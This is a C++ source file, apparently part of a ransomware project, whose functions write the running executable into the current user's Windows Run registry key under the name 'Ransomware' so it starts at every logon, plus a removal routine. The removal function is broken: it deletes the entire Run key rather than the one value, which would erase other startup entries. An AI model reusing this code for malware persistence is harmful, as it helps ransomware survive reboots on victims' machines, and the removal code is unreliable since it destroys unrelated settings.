
#include "stdafx.h"
#include "Registry.h"

//modified version of: http://stackoverflow.com/questions/15913202/add-application-to-startup-registry
//Adds a startup entry into the registry
BOOL Registry::RegisterForStartup(PCWSTR pszAppName, PCWSTR pathToExe)
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwSize;

	const size_t count = MAX_PATH * 2;
	wchar_t szValue[count] = {};


	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, pathToExe);
	wcscat_s(szValue, count, L"\" ");

	//Creates the registry key
	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		dwSize = (wcslen(szValue) + 1) * 2;
		//Creates the registry value with path to the executable and name
		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
		fSuccess = (lResult == 0);
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}

//removes the application from the startup registry
BOOL Registry::RemoveFromStartup(PCWSTR pszAppName, PCWSTR pathToExe)
{
	BOOL fSuccess = TRUE;
	HKEY hKey = HKEY_CURRENT_USER;

	//Removes the application from the registry key
	fSuccess = (RegDeleteKeyExW(hKey, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", NULL, NULL) == 0);


	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}
	return fSuccess;
}

void Registry::RegisterProgram()
{
	wchar_t szPathToExe[MAX_PATH];

	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
	RegisterForStartup(L"Ransomware", szPathToExe);
}

void Registry::RemoveProgram()
{
	wchar_t szPathToExe[MAX_PATH];

	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
	RemoveFromStartup(L"Ransomware", szPathToExe);
}
